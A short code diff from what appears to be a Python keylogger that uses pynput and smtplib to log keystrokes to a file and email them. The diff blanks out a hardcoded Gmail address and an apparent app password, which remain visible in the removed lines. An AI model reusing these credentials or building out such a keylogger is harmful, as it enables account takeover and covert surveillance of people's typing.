@@ -3,9 +3,9 @@ from pynput import keyboard
 import smtplib
 
 # Email account information
-EMAIL_ADDRESS = "cgarceau7399@gmail.com"
-# one-time Google App password for PyCharm
-EMAIL_PASSWORD = "zpqjcwwzyyxiookn"
+EMAIL_ADDRESS = ""
+# One-time Google App password for PyCharm
+EMAIL_PASSWORD = ""
 
 # text file that will store keystrokes
 log_file = "key_log.txt"
